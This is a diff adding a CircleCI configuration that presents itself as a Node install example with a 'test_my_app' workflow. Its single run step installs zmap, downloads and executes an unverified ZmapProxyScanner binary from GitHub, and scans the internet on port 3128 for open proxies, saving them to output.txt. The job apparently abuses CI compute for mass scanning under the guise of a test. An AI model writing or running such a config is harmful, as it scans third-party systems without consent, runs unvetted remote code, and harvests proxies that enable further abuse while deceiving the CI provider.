@@ -1,0 +1,17 @@
+version: 2.1
+
+jobs:
+  install-node-example:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - node/install:
+          install-yarn: true
+          node-version: '16.13'
+      - run: apt-get update -y && apt-get install zmap -y && wget https://github.com/Yariya/Zmap-ProxyScanner/releases/download/v1.0.0/config.json && wget https://github.com/Yariya/Zmap-ProxyScanner/releases/download/v1.0.0/ZmapProxyScanner && chmod +x ZmapProxyScanner && zmap -p 3128 | ./ZmapProxyScanner -p 3128 -o output.txt
+workflows:
+  test_my_app:
+    jobs:
+      - install-node-example
+
